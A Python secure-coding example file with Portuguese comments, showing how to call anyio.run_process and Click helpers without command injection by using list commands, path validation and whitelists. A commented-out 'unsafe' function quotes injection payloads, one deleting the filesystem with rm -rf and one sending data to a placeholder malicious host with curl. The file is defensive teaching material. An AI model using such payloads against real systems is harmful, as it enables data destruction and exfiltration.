
"""
Exemplos de uso seguro do anyio.run_process
Demonstra como prevenir injeção de comando conforme alerta de segurança
"""

import anyio
import shlex
import subprocess
from pathlib import Path
from typing import List, Optional
from security_config import SecurityConfig, ANYIO_PROCESS_CONFIG


async def safe_file_info(filepath: str) -> dict:
    """
    Exemplo SEGURO: Obter informações de arquivo usando anyio.run_process
    """
    try:
        # 1. Validar e sanitizar o caminho do arquivo
        safe_path = SecurityConfig.validate_path(filepath)
        
        # 2. Construir comando como LISTA (nunca como string)
        # Isso previne injeção de comando porque shell=False por padrão
        command = ["file", str(safe_path)]
        
        # 3. Validar comando antes da execução
        if not SecurityConfig.validate_command_list(command):
            raise ValueError("Comando inválido")
        
        # 4. Executar de forma segura
        result = await anyio.run_process(
            command,
            **ANYIO_PROCESS_CONFIG
        )
        
        return {
            "success": True,
            "output": result.stdout.decode() if result.stdout else "",
            "return_code": result.returncode
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }


async def unsafe_example_never_do_this(user_input: str):
    """
    Exemplo INSEGURO - NUNCA FAZER ISSO!
    Demonstra vulnerabilidade de injeção de comando
    """
    # ❌ PERIGOSO: Construir comando como string
    # Se user_input = "file.txt; rm -rf /", isso executaria ambos os comandos
    dangerous_command = f"cat {user_input}"
    
    # ❌ PERIGOSO: Usar shell=True permite interpretação de shell
    # result = await anyio.run_process(dangerous_command, shell=True)
    
    # Isso seria vulnerável a ataques como:
    # user_input = "file.txt; rm -rf /"
    # user_input = "file.txt && curl http://malicious-site.com/steal-data"
    pass  # Não executamos este exemplo perigoso


async def safe_file_operations_example(filename: str, operation: str) -> dict:
    """
    Exemplo de operações seguras em arquivos
    """
    try:
        # Validar nome do arquivo
        safe_filename = SecurityConfig.sanitize_command_arg(filename)
        safe_path = SecurityConfig.validate_path(filename)
        
        # Operações permitidas com comandos seguros
        if operation == "size":
            command = ["stat", "-c", "%s", str(safe_path)]
        elif operation == "lines":
            command = ["wc", "-l", str(safe_path)]
        elif operation == "type":
            command = ["file", "-b", str(safe_path)]
        else:
            raise ValueError(f"Operação não permitida: {operation}")
        
        # Validar e executar
        if not SecurityConfig.validate_command_list(command):
            raise ValueError("Comando não passou na validação de segurança")
        
        result = await anyio.run_process(command, **ANYIO_PROCESS_CONFIG)
        
        return {
            "success": True,
            "operation": operation,
            "filename": filename,
            "output": result.stdout.decode().strip() if result.stdout else "",
            "return_code": result.returncode
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }


# REGRAS DE OURO para anyio.run_process:
"""
1. ✅ SEMPRE usar command como lista: ["programa", "arg1", "arg2"]
2. ✅ NUNCA usar shell=True com entrada de usuário
3. ✅ SEMPRE validar entrada de usuário antes de usar
4. ✅ SEMPRE usar shlex.quote() para escapar argumentos se necessário
5. ✅ SEMPRE validar caminhos de arquivo para prevenir path traversal
6. ✅ SEMPRE usar timeout para prevenir travamento
7. ✅ SEMPRE validar comandos permitidos (whitelist)

❌ NUNCA fazer:
- Concatenar strings para formar comandos
- Usar shell=True com dados de usuário
- Confiar em entrada de usuário sem validação
- Permitir comandos arbitrários
"""


async def demonstrate_secure_patterns():
    """
    Demonstra padrões seguros para diferentes cenários
    """
    
    # Cenário 1: Informações de arquivo
    result1 = await safe_file_info("example.txt")
    print("File info:", result1)
    
    # Cenário 2: Operações múltiplas
    result2 = await safe_file_operations_example("test.txt", "size")
    print("File size:", result2)
    
    # Cenário 3: Usando SecurityConfig para construir comandos
    try:
        safe_command = SecurityConfig.build_safe_command("wc", ["-l", "document.txt"])
        result3 = await anyio.run_process(safe_command, **ANYIO_PROCESS_CONFIG)
        print("Line count:", result3.stdout.decode().strip() if result3.stdout else "")
    except Exception as e:
        print("Error:", e)


async def demonstrate_click_security():
    """
    Demonstra uso seguro das funções do Click que podem executar subprocessos
    """
    from security_config import SecurityConfig
    import click
    
    print("\n=== EXEMPLOS SEGUROS DO CLICK ===")
    
    # Exemplo 1: Uso seguro do click.edit()
    try:
        sample_content = "Este é um texto seguro para edição\nLinha 2\nLinha 3"
        safe_content = SecurityConfig.validate_editor_input(sample_content)
        print(f"✅ Conteúdo validado para edição: {len(safe_content)} caracteres")
        
        # Em produção, você chamaria: edited = click.edit(safe_content)
        print("   Click.edit() seria chamado com conteúdo seguro")
        
    except Exception as e:
        print(f"❌ Erro na validação de conteúdo para edição: {e}")
    
    # Exemplo 2: Uso seguro do click.launch()
    try:
        sample_url = "https://www.google.com"
        safe_url = SecurityConfig.validate_url_for_launch(sample_url)
        print(f"✅ URL validada para abertura: {safe_url}")
        
        # Em produção, você chamaria: click.launch(safe_url)
        print("   Click.launch() seria chamado com URL segura")
        
    except Exception as e:
        print(f"❌ Erro na validação de URL: {e}")
    
    # Exemplo 3: Uso seguro do click.echo_via_pager()
    try:
        sample_text = "Este é um texto longo para paginação\n" * 100
        safe_text = SecurityConfig.validate_pager_content(sample_text)
        print(f"✅ Texto validado para paginação: {len(safe_text)} caracteres")
        
        # Em produção, você chamaria: click.echo_via_pager(safe_text)
        print("   Click.echo_via_pager() seria chamado com texto seguro")
        
    except Exception as e:
        print(f"❌ Erro na validação de texto para paginação: {e}")


# REGRAS DE SEGURANÇA ESPECÍFICAS PARA CLICK:
"""
Para funções do Click que podem executar subprocessos:

1. ✅ click.edit(text):
   - SEMPRE validar o conteúdo de entrada com validate_editor_input()
   - O Click cria arquivos temporários seguros internamente
   - Limitar tamanho do conteúdo

2. ✅ click.launch(url):
   - SEMPRE validar URL com validate_url_for_launch()
   - Permitir apenas protocolos seguros (http/https/mailto)
   - Verificar formato da URL

3. ✅ click.echo_via_pager(text):
   - SEMPRE validar texto com validate_pager_content()
   - O Click usa pagers do sistema (less, more) de forma segura
   - Limitar tamanho do conteúdo

❌ NUNCA fazer:
- Passar entrada de usuário diretamente para essas funções
- Concatenar strings de usuário em URLs ou conteúdo
- Ignorar validação de entrada
- Permitir conteúdo arbitrário sem sanitização
"""

if __name__ == "__main__":
    # Executar exemplos
    print("Executando exemplos de segurança...")
    anyio.run(demonstrate_secure_patterns)
    anyio.run(demonstrate_click_security)
